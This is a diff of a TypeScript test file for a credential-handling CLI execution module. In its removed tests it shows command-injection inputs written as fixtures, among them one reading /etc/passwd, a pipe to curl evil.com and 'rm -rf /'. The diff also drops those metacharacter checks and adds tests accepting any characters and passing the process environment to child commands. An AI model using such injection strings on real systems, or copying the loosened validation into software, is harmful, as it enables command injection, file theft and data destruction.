@@ -1,15 +1,11 @@
-/**
- * Tests for secure CLI execution (RFC 0001)
- */
-
-import { describe, it, expect, beforeEach } from 'vitest';
+import { describe, it, expect } from 'vitest';
 import {
   validateCommand,
   buildExecEnv,
   scrubCredentials,
   executeCommand,
+  hashPolicyFingerprint,
 } from './exec';
-import fs from 'fs';
 
 describe('validateCommand', () => {
   const allowCommands = ['bird', 'gh', 'stripe'];
@@ -41,34 +37,12 @@ describe('validateCommand', () => {
       .toEqual({ allowed: true });
   });
 
-  it('rejects shell metacharacters in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', '$(cat /etc/passwd)'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('rejects pipe operators in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', 'hello | curl evil.com'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('rejects semicolons in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', 'hello; rm -rf /'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('rejects backticks in arguments', () => {
-    const result = validateCommand(['bird', 'tweet', '`whoami`'], allowCommands);
-    expect(result.allowed).toBe(false);
-    expect(result.reason).toContain('shell metacharacters');
-  });
-
-  it('allows normal arguments with spaces and punctuation', () => {
+  it('allows arguments with any characters', () => {
     expect(validateCommand(['bird', 'tweet', 'Hello world! This is a test.'], allowCommands))
       .toEqual({ allowed: true });
     expect(validateCommand(['gh', 'issue', 'create', '--title', 'Bug: fix needed'], allowCommands))
+      .toEqual({ allowed: true });
+    expect(validateCommand(['gh', 'issue', 'create', '--body', 'contains $vars and `backticks`'], allowCommands))
       .toEqual({ allowed: true });
   });
 });
@@ -156,14 +130,32 @@ describe('scrubCredentials', () => {
   });
 });
 
-describe('executeCommand', () => {
-  beforeEach(() => {
-    // Ensure working directory exists
-    if (!fs.existsSync('/tmp/janee-exec')) {
-      fs.mkdirSync('/tmp/janee-exec', { recursive: true });
-    }
-  });
 
+describe('hashPolicyFingerprint', () => {
+  it('is stable for the same policy inputs', () => {
+    const first = hashPolicyFingerprint({
+      name: 'cap',
+      mode: 'exec',
+      allowCommands: ['git', 'gh'],
+      workDir: '/workspace',
+      timeout: 30000,
+      env: { GH_TOKEN: '{{credential}}' },
+    });
+    const second = hashPolicyFingerprint({
+      name: 'cap',
+      mode: 'exec',
+      allowCommands: ['git', 'gh'],
+      workDir: '/workspace',
+      timeout: 30000,
+      env: { GH_TOKEN: '{{credential}}' },
+    });
+
+    expect(first).toBe(second);
+    expect(first).toContain('policy-');
+  });
+});
+
+describe('executeCommand', () => {
   it('executes a simple command and returns stdout', async () => {
     const result = await executeCommand(
       ['echo', 'hello world'],
@@ -254,12 +246,37 @@ describe('executeCommand', () => {
     expect(result.exitCode).not.toBe(0);
   }, 5000);
 
+
+  it('inherits process env', async () => {
+    process.env.JANEE_TEST_INHERIT_CHECK = 'visible-value';
+    const result = await executeCommand(
+      ['sh', '-c', 'echo "$JANEE_TEST_INHERIT_CHECK"'],
+      {},
+      { credential: '' }
+    );
+    delete process.env.JANEE_TEST_INHERIT_CHECK;
+    expect(result.stdout.trim()).toBe('visible-value');
+  });
+
+  it('reports scrub hit counts', async () => {
+    const secret = 'count-secret-123456';
+    const result = await executeCommand(
+      ['sh', '-c', `echo "${secret} ${secret}" && echo "${secret}" >&2`],
+      {},
+      { credential: secret }
+    );
+
+    expect(result.scrubbedStdoutHits).toBe(2);
+    expect(result.scrubbedStderrHits).toBe(1);
+  });
+
   it('uses specified working directory', async () => {
     const result = await executeCommand(
       ['pwd'],
       {},
       { credential: '', workDir: '/tmp' }
     );
-    expect(result.stdout.trim()).toBe('/tmp');
+    // macOS resolves /tmp -> /private/tmp via symlink
+    expect(result.stdout.trim()).toMatch(/^\/?(?:private\/)?tmp$/);
   });
 });
